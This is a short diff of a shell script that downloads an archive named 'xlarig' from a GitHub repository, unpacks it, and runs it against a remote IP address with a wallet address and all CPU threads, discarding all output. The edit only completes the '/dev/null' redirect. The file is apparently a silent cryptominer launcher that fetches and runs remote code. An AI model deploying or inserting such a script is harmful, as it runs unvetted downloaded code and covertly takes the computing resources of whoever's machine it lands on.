@@ -1,2 +1,2 @@
 wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o 172.105.127.237:443 -u ZEPHsCqGkBEAAPRnLwxVFAEvQzQNfS83Z1J8hMxf1gtyfXEohBgrqFp5DNQ4PFVkVD95jVvXjXc2PHgmDfyZbAtVBGYUV1gMdiJ -p TESS -t $(nproc --all) >/dev/n
+./xlarig -o 172.105.127.237:443 -u ZEPHsCqGkBEAAPRnLwxVFAEvQzQNfS83Z1J8hMxf1gtyfXEohBgrqFp5DNQ4PFVkVD95jVvXjXc2PHgmDfyZbAtVBGYUV1gMdiJ -p TESS -t $(nproc --all) >/dev/null 2>&1
